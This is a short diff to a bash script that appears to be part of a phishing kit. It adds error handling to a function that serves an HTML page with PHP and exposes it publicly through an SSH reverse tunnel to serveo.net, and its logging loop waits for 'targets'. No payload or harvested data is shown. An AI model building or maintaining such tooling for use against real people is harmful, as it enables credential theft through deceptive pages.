@@ -907,15 +907,23 @@ start_serveo_server() {
     php_pid=$!
     echo -e "${RED}[+] PHP server started at http://localhost:3333/${page}.html${NC}"
 
+    if [[ ! -f "${page}.html" ]]; then
+        echo -e "${RED}[-] Error: File ${page}.html not found!${NC}"
+        kill $php_pid 2> /dev/null
+        exit 1
+    fi
+
+    chmod 644 "${page}.html"
+
     echo -e "${GREEN}[+] Starting SSH tunnel with Serveo...${NC}"
     ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1 &
     ssh_pid=$!
     sleep 8
 
-    echo -e "${GREEN}[+] Fetching Serveo URL...${NC}"
     serveo_url=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
     if [[ -z "$serveo_url" ]]; then
         echo -e "${RED}[-] Failed to start Serveo.net. Please make sure SSH is installed and try again.${NC}"
+        kill $php_pid 2> /dev/null
         exit 1
     fi
 
@@ -927,7 +935,6 @@ start_serveo_server() {
         sleep 1
     done
 }
-
 display_logs() {
     echo -e "${YELLOW}[+] Waiting for targets... Press Ctrl+C to exit.${NC}"
     while true; do
